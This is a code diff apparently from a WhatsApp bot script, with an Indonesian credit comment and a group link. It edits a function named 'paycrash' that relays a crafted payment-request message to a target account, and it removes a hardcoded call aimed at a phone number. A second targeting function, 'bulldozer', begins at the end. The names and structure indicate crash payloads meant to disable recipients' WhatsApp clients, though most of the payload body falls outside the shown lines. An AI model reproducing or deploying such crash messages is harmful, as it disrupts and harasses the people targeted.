@@ -2007,9 +2007,9 @@ https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
 
 THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
 */
-async function paycrash(bokep) {
+async function paycrash(target) {
     await kipop.relayMessage(
-        bokep,
+        target,
         {
             requestPaymentMessage: {
                 currencyCodeIso4217: "XXX",
@@ -2044,14 +2044,12 @@ async function paycrash(bokep) {
             }
         },
         {
-            participant: { jid: bokep }
+            participant: { jid: target }
         }
     );
 
     //await devorsix.offerCall(bokep);
 }
-
-paycrash("62895099999999@s.whatsapp.net");
 async function bulldozer(isTarget) {
   let message = {
     viewOnceMessage: {
